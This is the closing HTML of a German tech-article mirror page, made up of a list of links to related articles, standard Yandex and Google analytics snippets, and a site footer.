<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de439608/index.html">Moderne Religion: Was geben Google, Facebook, Amazon und Apple den Menschen?</a></li>
<li><a href="../de439610/index.html">Wie bei meinem Elektrofahrzeug Chevrolet Bolt wurden im Rahmen der Garantie zwei Batteriemodule ausgetauscht und das dritte überwacht</a></li>
<li><a href="../de439612/index.html">Robustes JavaScript: Jagd nach einem Mythos</a></li>
<li><a href="../de439614/index.html">Wie man eine gute Reparatur von einer schlechten unterscheidet oder wie wir in SRG eine Multithread-Java-Bibliothek aus dem Tomit-Parser erstellt haben</a></li>
<li><a href="../de439616/index.html">Die Zusammenfassung interessanter IT-Projekte auf Kickstarter Nr. 7</a></li>
<li><a href="../de439620/index.html">Asynchronität in JavaScript verstehen [Übersetzung von Sukhjinder Arora]</a></li>
<li><a href="../de439624/index.html">Warum Daten im Orbit speichern?</a></li>
<li><a href="../de439626/index.html">Erleben Sie die Entwicklung einer kostenlosen Anwendung für OpenNumismat-Sammler</a></li>
<li><a href="../de439628/index.html">Parallele Datenaktualisierung in der ASP.NET-Web-API</a></li>
<li><a href="../de439632/index.html">So richten Sie Continuous Deployment für Ihr Projekt ein: persönliche Erfahrung</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>